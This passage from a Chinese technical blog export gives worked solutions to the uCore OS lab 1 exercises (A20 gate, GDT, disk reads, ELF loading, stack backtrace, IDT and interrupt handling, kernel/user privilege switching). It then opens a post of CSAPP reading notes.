<p>A20 Gate的方法是把A20地址线控制和键盘控制器的一个输出进行AND操作，这样来控制A20地址线的打开（使能）和关闭（屏蔽\禁止）。一开始时A20地址线控制是被屏蔽的（总为0），直到系统软件通过一定的IO操作去打开它。当A20 地址线控制禁止时，则程序就像在8086中运行，1MB以上的地址不可访问；保护模式下A20地址线控制必须打开。A20控制打开后，内存寻址将不会发生回卷。</p>
</li>
<li>
<p>在当前环境中，所用到的键盘控制器8042的IO端口只有0x60和0x64两个端口。8042通过这些端口给键盘控制器或键盘发送命令或读取状态。输出端口P2用于特定目的。位0（P20引脚）用于实现CPU复位操作，位1（P21引脚）用于控制A20信号线的开启与否。<br>
<img src="/2020/08/uCore-1/8042Keyboard.png" alt="img"><br>
我们要操作的位置是8042三个内部端口中<strong>输出端口</strong>的bit 1上，其写入该端口的做法为：</p>
<blockquote>
<p>写Output Port：向64h发送0xd1命令，然后向60h写入Output Port的数据</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>启动A20的汇编代码如下</p>
  <figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">    # Enable A20:</span><br><span class="line">    #  For backwards compatibility with the earliest PCs, physical</span><br><span class="line">    #  address line <span class="number">20</span> is tied low, so that addresses higher than</span><br><span class="line">    #  1MB wrap around to <span class="meta">zero</span> by <span class="meta">default</span>. This code undoes this.</span><br><span class="line"><span class="symbol">seta20.1:</span></span><br><span class="line">    # 读取<span class="number">0x64</span>端口——读Status Register</span><br><span class="line">    inb <span class="number">$0</span>x64, %al    # Wait for <span class="keyword">not</span> busy(<span class="number">8042</span> input buffer empty).</span><br><span class="line">    testb <span class="number">$0</span>x2, %al   # 读取到<span class="number">2</span>则表明缓冲区中没有数据</span><br><span class="line">  <span class="keyword">jnz</span> seta20<span class="number">.1</span></span><br><span class="line"></span><br><span class="line">    movb <span class="number">$0</span>xd1, %al  # <span class="number">0xd1</span> -&gt; port <span class="number">0x64</span></span><br><span class="line">  outb %al, <span class="number">$0</span>x64  # <span class="number">0xd1</span> means: write data to <span class="number">8042</span><span class="string">'s P2 port</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">seta20.2:</span></span><br><span class="line"><span class="string">    inb $0x64, %al   # Wait for not busy(8042 input buffer empty).</span></span><br><span class="line"><span class="string">    testb $0x2, %al</span></span><br><span class="line"><span class="string">  jnz seta20.2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    movb $0xdf, %al  # 0xdf -&gt; port 0x60</span></span><br><span class="line"><span class="string">    outb %al, $0x60  # 0xdf = 11011111, means set P2'</span>s A20 bit(the <span class="number">1</span> bit) to <span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>如何初始化GDT表</p>
<ul>
<li>设置GDT中的第一项描述符为空。</li>
<li>设置GDT中的第二项描述符为代码段使用，其属性为可读写可执行。</li>
<li>设置GDT中的第三项描述符为数据段使用，其属性为可读写。</li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">  # Bootstrap GDT</span><br><span class="line"><span class="meta">.p2align</span> <span class="number">2</span>                                          # force <span class="number">4</span> <span class="built_in">byte</span> alignment</span><br><span class="line"><span class="symbol">gdt:</span></span><br><span class="line">    SEG_NULLASM                                     # null <span class="built_in">seg</span></span><br><span class="line">    SEG_ASM(STA_X|STA_R, <span class="number">0x0</span>, <span class="number">0xffffffff</span>)           # code <span class="built_in">seg</span> for bootloader <span class="keyword">and</span> kernel</span><br><span class="line">    SEG_ASM(STA_W, <span class="number">0x0</span>, <span class="number">0xffffffff</span>)                 # data <span class="built_in">seg</span> for bootloader <span class="keyword">and</span> kernel</span><br><span class="line"></span><br><span class="line"><span class="symbol">gdtdesc:</span></span><br><span class="line"><span class="meta">    .word</span> <span class="number">0x17</span>                                      # sizeof(gdt) - <span class="number">1</span></span><br><span class="line"><span class="meta">    .long</span> gdt                                       # address gdt</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>如何使能和进入保护模式</p>
<ul>
<li>将%cr0寄存器置1。</li>
<li>%cr0寄存器置1后，长跳转<code>ljmp $PROT_MODE_CSEG, $protcseg</code>以更新cs基地址。</li>
</ul>
</li>
</ul>
<h3 id="4-练习4">4. 练习4</h3>
<blockquote>
<p>分析bootloader加载ELF格式的OS的过程.</p>
</blockquote>
<ul>
<li>
<p>bootloader如何读取硬盘扇区的？</p>
<ul>
<li>
<p>bootloader让CPU进入保护模式后，下一步的工作就是从硬盘上加载并运行OS。考虑到实现的简单性，bootloader的访问硬盘都是LBA模式的PIO（Program IO）方式，即所有的IO操作是通过CPU访问硬盘的IO地址寄存器完成。硬盘相关的IO地址与功能如下:</p>
<table>
<thead>
<tr>
<th style="text-align:center">IO地址</th>
<th style="text-align:left">功能</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0x1f0</td>
<td style="text-align:left">读数据，当0x1f7不为忙状态时，可以读。</td>
</tr>
<tr>
<td style="text-align:center">0x1f2</td>
<td style="text-align:left">要读写的扇区数，每次读写前，你需要表明你要读写几个扇区。最小是1个扇区</td>
</tr>
<tr>
<td style="text-align:center">0x1f3</td>
<td style="text-align:left">如果是LBA模式，就是LBA参数的0-7位</td>
</tr>
<tr>
<td style="text-align:center">0x1f4</td>
<td style="text-align:left">如果是LBA模式，就是LBA参数的8-15位</td>
</tr>
<tr>
<td style="text-align:center">0x1f5</td>
<td style="text-align:left">如果是LBA模式，就是LBA参数的16-23位</td>
</tr>
<tr>
<td style="text-align:center">0x1f6</td>
<td style="text-align:left">第0~3位：如果是LBA模式就是24-27位 第4位：为0主盘；为1从盘</td>
</tr>
<tr>
<td style="text-align:center">0x1f7</td>
<td style="text-align:left">状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>当前 硬盘数据是储存到硬盘扇区中，一个扇区大小为512字节。读一个扇区的流程大致如下：</p>
<ul>
<li>等待磁盘准备好</li>
<li>发出读取扇区的命令</li>
<li>等待磁盘准备好</li>
<li>把磁盘扇区数据读到指定内存</li>
</ul>
</li>
<li>
<p>相关实现代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* waitdisk - wait for disk ready */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">waitdisk</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取并判断磁盘是否处于忙碌状态</span></span><br><span class="line">    <span class="keyword">while</span> ((inb(<span class="number">0x1F7</span>) &amp; <span class="number">0xC0</span>) != <span class="number">0x40</span>)</span><br><span class="line">        <span class="comment">/* do nothing */</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* readsect - read a single sector at @secno into @dst */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readsect</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> secno)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 等待磁盘准备就绪</span></span><br><span class="line">    waitdisk();</span><br><span class="line">    <span class="comment">// 设置磁盘参数</span></span><br><span class="line">    outb(<span class="number">0x1F2</span>, <span class="number">1</span>);                         <span class="comment">// 读取1个扇区</span></span><br><span class="line">    outb(<span class="number">0x1F3</span>, secno &amp; <span class="number">0xFF</span>);              <span class="comment">// 0x1F3-0x1F6 设置LBA模式的参数</span></span><br><span class="line">    outb(<span class="number">0x1F4</span>, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F5</span>, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F6</span>, ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>) | <span class="number">0xE0</span>);</span><br><span class="line">    outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>);                      <span class="comment">// 设置磁盘命令为“读取”</span></span><br><span class="line">    <span class="comment">// 等待磁盘准备就绪</span></span><br><span class="line">    waitdisk();</span><br><span class="line">    <span class="comment">// 从0x1F0端口处读数据</span></span><br><span class="line">    insl(<span class="number">0x1F0</span>, dst, SECTSIZE / <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>bootloader是如何加载ELF格式的OS？</p>
<ul>
<li>
<p>bootloader先将ELF格式的OS加载到地址<code>0x10000</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">readseg((<span class="keyword">uintptr_t</span>)ELFHDR, SECTSIZE * <span class="number">8</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>之后通过比对ELF的magic number来判断读入的ELF文件是否正确。</p>
</li>
<li>
<p>再将ELF中每个段都加载到特定的地址。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// load each program segment (ignores ph flags)</span></span><br><span class="line">ph = (struct proghdr *)((<span class="keyword">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line">eph = ph + ELFHDR-&gt;e_phnum;</span><br><span class="line"><span class="keyword">for</span> (; ph &lt; eph; ph ++)</span><br><span class="line">    readseg(ph-&gt;p_va &amp; <span class="number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>最后跳转至ELF文件的程序入口点(entry point)。</p>
</li>
</ul>
</li>
</ul>
<h3 id="5-练习5">5. 练习5</h3>
<blockquote>
<p>实现函数调用堆栈跟踪函数.</p>
</blockquote>
<ul>
<li>
<p>具体实现如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">+|  栈底方向    | 高位地址</span></span><br><span class="line"><span class="comment"> |    ...       |</span></span><br><span class="line"><span class="comment"> |    ...       |</span></span><br><span class="line"><span class="comment"> |  参数3       |</span></span><br><span class="line"><span class="comment"> |  参数2       |</span></span><br><span class="line"><span class="comment"> |  参数1       |</span></span><br><span class="line"><span class="comment"> |  返回地址     |</span></span><br><span class="line"><span class="comment"> |  上一层[ebp]  | &lt;-------- [ebp]</span></span><br><span class="line"><span class="comment"> |  局部变量     |  低位地址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_stackframe</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 读取当前栈帧的ebp和eip</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ebp = read_ebp();</span><br><span class="line">    <span class="keyword">uint32_t</span> eip = read_eip();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">uint32_t</span> i = <span class="number">0</span>; ebp != <span class="number">0</span> &amp;&amp; i &lt; STACKFRAME_DEPTH; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 读取</span></span><br><span class="line">        cprintf(<span class="string">"ebp:0x%08x eip:0x%08x args:"</span>, ebp, eip);</span><br><span class="line">        <span class="keyword">uint32_t</span>* args = (<span class="keyword">uint32_t</span>*)ebp + <span class="number">2</span> ;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">uint32_t</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">            cprintf(<span class="string">"0x%08x "</span>, args[j]);</span><br><span class="line">        cprintf(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="comment">// eip指向异常指令的下一条指令，所以要减1</span></span><br><span class="line">        print_debuginfo(eip<span class="number">-1</span>);</span><br><span class="line">        <span class="comment">// 将ebp 和eip设置为上一个栈帧的ebp和eip</span></span><br><span class="line">        <span class="comment">//  注意要先设置eip后设置ebp，否则当ebp被修改后，eip就无法找到正确的位置</span></span><br><span class="line">        eip = *((<span class="keyword">uint32_t</span>*)ebp + <span class="number">1</span>);</span><br><span class="line">        ebp = *(<span class="keyword">uint32_t</span>*)ebp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>有几个点需要注意一下</p>
<ul>
<li>栈的方向是从高地址向低地址增长，切勿弄错方向。</li>
<li>指针运算要格外小心，避免因为错误的运算顺序(例如先相加，再强制转换为指针类型)而导致指针的运算错误。</li>
<li><code>eip</code>指向异常指令的下一条指令，所以要传入<code>print_debuginfo</code>的参数为<code>eip-1</code></li>
<li>在切换栈帧时，先切换<code>eip</code>，后切换<code>ebp</code>，两者顺序不能颠倒。原因是当先切换ebp后，再切换的eip是已切换后的栈帧的上一个栈帧eip。eip隔着一个栈帧进行了切换，会导致输出错误。</li>
<li>如果想与标准答案比对自己的输出信息是否正确，请运行<code>labcodes_answer/kern/debug/kdebug.c</code>中的<code>print_stackframe</code>.</li>
</ul>
</li>
</ul>
<h3 id="6-练习6">6. 练习6</h3>
<blockquote>
<p>完善中断初始化和处理</p>
</blockquote>
<ul>
<li>
<p>中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？</p>
<ul>
<li>
<p>一个表项的结构如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Gate descriptors for interrupts and traps */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gatedesc</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_off_15_0 : <span class="number">16</span>;        <span class="comment">// low 16 bits of offset in segment</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_ss : <span class="number">16</span>;            <span class="comment">// segment selector</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_args : <span class="number">5</span>;            <span class="comment">// # args, 0 for interrupt/trap gates</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_rsv1 : <span class="number">3</span>;            <span class="comment">// reserved(should be zero I guess)</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_type : <span class="number">4</span>;            <span class="comment">// type(STS_&#123;TG,IG32,TG32&#125;)</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_s : <span class="number">1</span>;                <span class="comment">// must be 0 (system)</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_dpl : <span class="number">2</span>;            <span class="comment">// descriptor(meaning new) privilege level</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_p : <span class="number">1</span>;                <span class="comment">// Present</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_off_31_16 : <span class="number">16</span>;        <span class="comment">// high bits of offset in segment</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>该表项的大小为<code>16+16+5+3+4+1+2+1+16 == 8*8</code>bit，即<strong>8字节</strong>。</p>
</li>
<li>
<p>根据IDT表项的结构，我们可以得知，IDT表项的第二个成员<code>gd_ss</code>为段选择子，第一个成员<code>gd_off_15_0</code>和最后一个成员<code>gd_off_31_16</code>共同组成一个段内偏移地址。根据段选择子和段内偏移地址就可以得出中断处理程序的地址。</p>
</li>
</ul>
</li>
<li>
<p>编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init.</p>
<ul>
<li>
<p>具体实现如下，详细信息以注释的形式写入代码中。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idt_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// __vectors定义于vector.S中</span></span><br><span class="line">  <span class="keyword">extern</span> <span class="keyword">uintptr_t</span> __vectors[];</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(idt) / <span class="keyword">sizeof</span>(struct gatedesc); i ++)</span><br><span class="line">      <span class="comment">// 目标idt项为idt[i]</span></span><br><span class="line">      <span class="comment">// 该idt项为内核代码，所以使用GD_KTEXT段选择子</span></span><br><span class="line">      <span class="comment">// 中断处理程序的入口地址存放于__vectors[i]</span></span><br><span class="line">      <span class="comment">// 特权级为DPL_KERNEL</span></span><br><span class="line">      SETGATE(idt[i], <span class="number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);</span><br><span class="line">  <span class="comment">// 设置从用户态转为内核态的中断的特权级为DPL_USER</span></span><br><span class="line">  SETGATE(idt[T_SWITCH_TOK], <span class="number">0</span>, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER);</span><br><span class="line">  <span class="comment">// 加载该IDT</span></span><br><span class="line">  lidt(&amp;idt_pd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p>编程完善trap.c中的中断处理函数trap，在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用print_ticks子程序，向屏幕上打印一行文字”100 ticks”。</p>
<ul>
<li>
<p>这个实现还是比较简单的，具体实现如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* trap_dispatch - dispatch based on what type of trap occurred */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">trap_dispatch</span><span class="params">(struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">switch</span> (tf-&gt;tf_trapno) &#123;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</span><br><span class="line">        <span class="comment">// 全局变量ticks定义于kern/driver/clock.c</span></span><br><span class="line">        ticks++;</span><br><span class="line">        <span class="keyword">if</span>(ticks % TICK_NUM == <span class="number">0</span>)</span><br><span class="line">            print_ticks();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// .........</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="7-扩展练习">7. 扩展练习</h3>
<blockquote>
<p>请注意：强烈建议学习完lab2中<strong>特权级切换</strong>的相关知识后再完成该扩展练习。</p>
</blockquote>
<h4 id="1-Challenge-1">1) Challenge 1</h4>
<blockquote>
<p>增加一组切换特权级的函数。当内核初始完毕后，可从内核态返回到用户态的函数，而用户态的函数又通过系统调用得到内核态的服务</p>
</blockquote>
<blockquote>
<p>部分讲解以注释的形式写入代码中。更详细的讲解请查看<a href="#3-%E9%80%9A%E8%BF%87%E4%B8%AD%E6%96%AD%E5%88%87%E6%8D%A2%E7%89%B9%E6%9D%83%E7%BA%A7">通过中断切换特权级</a></p>
</blockquote>
<ul>
<li>
<p>用户态转内核态</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全局变量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> <span class="title">switchk2u</span>;</span></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">case</span> T_SWITCH_TOK:</span><br><span class="line">    <span class="keyword">if</span> (tf-&gt;tf_cs != KERNEL_CS) &#123;</span><br><span class="line">    <span class="comment">// 修改CPL DPL IOPL以提升特权级</span></span><br><span class="line">    tf-&gt;tf_cs = KERNEL_CS;</span><br><span class="line">    tf-&gt;tf_ds = tf-&gt;tf_es = KERNEL_DS;</span><br><span class="line">    tf-&gt;tf_eflags &amp;= ~FL_IOPL_MASK;</span><br><span class="line">    <span class="comment">// 计算将要保存新trapFrame的用户栈地址</span></span><br><span class="line">    <span class="comment">//    数值减8是因为内核调用中断时CPU没有压入ss和esp</span></span><br><span class="line">    switchu2k = (struct trapframe *)(tf-&gt;tf_esp - (<span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>));</span><br><span class="line">    <span class="comment">// 将修改后的trapFrame写入用户栈(注意当前是内核栈)。注意trapFrame中ss和esp的值不需要写入。</span></span><br><span class="line">    memmove(switchu2k, tf, <span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// 设置弹出esp的值为用户栈的新地址</span></span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)tf - <span class="number">1</span>) = (<span class="keyword">uint32_t</span>)switchu2k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>内核态转用户态</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全局变量</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">switchu2k</span>;</span></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">case</span> T_SWITCH_TOU:</span><br><span class="line">    <span class="keyword">if</span> (tf-&gt;tf_cs != USER_CS) &#123;</span><br><span class="line">    <span class="comment">// 将中断的栈帧赋给临时中断帧</span></span><br><span class="line">    switchk2u = *tf;</span><br><span class="line">    <span class="comment">// 修改可执行代码段为USER_CS</span></span><br><span class="line">    switchk2u.tf_cs = USER_CS;</span><br><span class="line">    <span class="comment">// 修改数据段为USER_DS</span></span><br><span class="line">    switchk2u.tf_ds = switchk2u.tf_es = switchk2u.tf_ss = USER_DS;</span><br><span class="line">    <span class="comment">// 设置从中断处理程序返回时的栈地址</span></span><br><span class="line">    <span class="comment">//    数值减8是因为iret不会弹出ss和esp，所以不需要这8个字节</span></span><br><span class="line">    switchk2u.tf_esp = (<span class="keyword">uint32_t</span>)tf + <span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>;</span><br><span class="line">    <span class="comment">// 为了使得程序在低CPL的情况下仍然能够使用IO</span></span><br><span class="line">    <span class="comment">// 需要将eflags中对应的IOPL位置成表示用户态的3</span></span><br><span class="line">    switchk2u.tf_eflags |= FL_IOPL_MASK;</span><br><span class="line">    <span class="comment">// 设置中断处理例程结束时pop出的%esp，这样可以用修改后的数据来恢复上下文。</span></span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)tf - <span class="number">1</span>) = (<span class="keyword">uint32_t</span>)&amp;switchk2u;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 事实上上述代码并没有实际完成一个从内核栈到用户态栈的切换</span></span><br><span class="line">    <span class="comment">// 仅仅是完成了特权级的切换。这属于正常现象。</span></span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>使用int中断的代码</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">lab1_switch_to_user(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">"int %0 \n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">        :</span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">"i"</span>(T_SWITCH_TOU)</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">lab1_switch_to_kernel(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="string">"int %0 \n"</span></span></span></span><br><span class="line"><span class="function"><span class="params">        :</span></span></span><br><span class="line"><span class="function"><span class="params">        : <span class="string">"i"</span>(T_SWITCH_TOK)</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>虽然在修改特权级的代码中，修改CPL和DPL是以赋值的形式而不是以位运算的形式来修改，但内核仍然可以正常工作，因为在Lab1中，GDT中所有段描述符的基地址<strong>都是相同的值</strong>—— <strong>0</strong> 。</p>
</blockquote>
<h4 id="2-Challenge-2">2) Challenge 2</h4>
<blockquote>
<p>用键盘实现用户模式内核模式切换。具体目标是：“键盘输入3时切换到用户模式，键盘输入0时切换到内核模式”。</p>
</blockquote>
<ul>
<li>切换内核的代码直接照搬<code>Challenge 1</code>的代码即可。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// in `trap_dispatch` of `trap.c`</span></span><br><span class="line"><span class="keyword">case</span> IRQ_OFFSET + IRQ_KBD:</span><br><span class="line">    c = cons_getc();</span><br><span class="line">    cprintf(<span class="string">"kbd [%03d] %c\n"</span>, c, c);</span><br><span class="line">    <span class="comment">// 切换特权级的代码直接照抄之前编写的代码</span></span><br><span class="line">    <span class="keyword">if</span>(c == <span class="string">'0'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (tf-&gt;tf_cs != KERNEL_CS) &#123;</span><br><span class="line">            cprintf(<span class="string">"+++ switch to  kernel  mode +++\n"</span>);</span><br><span class="line">            tf-&gt;tf_cs = KERNEL_CS;</span><br><span class="line">            tf-&gt;tf_ds = tf-&gt;tf_es = KERNEL_DS;</span><br><span class="line">            tf-&gt;tf_eflags &amp;= ~FL_IOPL_MASK;</span><br><span class="line">            switchu2k = (struct trapframe *)(tf-&gt;tf_esp - (<span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>));</span><br><span class="line">            memmove(switchu2k, tf, <span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>);</span><br><span class="line">            *((<span class="keyword">uint32_t</span> *)tf - <span class="number">1</span>) = (<span class="keyword">uint32_t</span>)switchu2k;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">'3'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">          <span class="keyword">if</span> (tf-&gt;tf_cs != USER_CS) &#123;</span><br><span class="line">            cprintf(<span class="string">"+++ switch to  user  mode +++\n"</span>);</span><br><span class="line">            switchk2u = *tf;</span><br><span class="line">            switchk2u.tf_cs = USER_CS;</span><br><span class="line">            switchk2u.tf_ds = switchk2u.tf_es = switchk2u.tf_ss = USER_DS;</span><br><span class="line">            switchk2u.tf_esp = (<span class="keyword">uint32_t</span>)tf + <span class="keyword">sizeof</span>(struct trapframe) - <span class="number">8</span>;</span><br><span class="line">            switchk2u.tf_eflags |= FL_IOPL_MASK;</span><br><span class="line">            *((<span class="keyword">uint32_t</span> *)tf - <span class="number">1</span>) = (<span class="keyword">uint32_t</span>)&amp;switchk2u;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>uCore</tag>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP笔记</title>
    <url>/2020/07/csapp/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>这里存放着一点笔者阅读CSAPP所记录的笔记</li>
<li>由于CSAPP内容众多，这里只记录了一些笔者学习的主要点</li>
<li>根据笔者的进度，持续更新。单次更新随缘记录。</li>
</ul>
<a id="more"></a>
<h2 id="一、-计算机系统漫游">一、 计算机系统漫游</h2>
<ul>
<li>在计算机世界中，<strong>信息</strong> 就是位(bit) + 上下文。在不同的上下文中，其数据也会表示出不同的意思。<br>
例如：
<ul>
<li>在一串数字中，0x90表示154</li>
<li>在一串机器码中，0x90表示nop指令</li>
<li>在 一串字符串中，0x90表示一个特殊的字符</li>
</ul>
</li>
<li>代码语言可以被其他程序翻译为不同的格式。以C语言为例，其中可以分为如下几个阶段
<ul>
<li><strong>预处理阶段</strong>。 预处理器(cpp)根据<code>#</code>开头的预处理命令，插入或隐藏部分代码。修改后的源代码以<code>.i</code>为后缀</li>
<li><strong>编译阶段</strong>。编译器(ccl)将<code>.i</code>文件编译为汇编代码<code>.s</code>文件</li>
<li><strong>汇编阶段</strong>。汇编器(as)读取<code>.s</code>文件并将其转换为机器语言指令，打包生成一种<em>可重定位目标指令</em>的格式，并将其保存在<code>.o</code>文件中。</li>
<li><strong>链接阶段</strong>。有些<code>.o</code>文件调用了某个库函数，但这个库函数的实现在另一个<code>.o</code>文件中。因此链接器(ld)需要将各种<code>.o</code>文件链接，最终生成可执行文件。</li>
</ul>
</li>
<li>系统的硬件由以下几个部件组成
<ul>
<li>总线</li>
<li>I/O设备</li>
<li>主存</li>
<li>处理器(CPU)
<ul>
<li>处理器执行的操作会围绕寄存器文件(register file)和算术/逻辑单元(ALU)进行。</li>
<li>处理器在指令的要求下可能会执行<em>加载、存储、操作、跳转</em>等操作</li>
</ul>
</li>
</ul>
</li>
<li>处理器的运行速度很快，但数据从主存运送到CPU里却相当的慢。这其中速度可能相差百倍以上，大大拖累了CPU的速度。<br>
针对这种处理器与主存之间的差异，系统设计者引入了更小更快的存储设备——<em>高速缓存存储器</em>(cache)，这其中利用了高速缓存的<em>局部性原理</em>。</li>
<li>操作系统管理硬件
<ul>
<li>我们可以将做操系统看成是应用程序和硬件之间插入的一层软件，所有应用程序对硬件的操作尝试都必须通过操作系统。</li>
<li>操作系统的基本功能
<ul>
<li>防止硬件被失控的应用程序滥用。</li>
<li>向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。</li>
</ul>
</li>
<li>文件是对I/O设备的抽象表示，虚拟内存是对主存和磁盘I/O设备的抽象表示。进程则是对处理器、主存和I/O设备的抽象表示。</li>
<li><strong>进程</strong>
<ul>
<li>进程是操作系统对一个正在运行的程序的一种抽象。而<em>并发运行</em>，则是一个进程的指令和另一个进程的指令交错进行。</li>
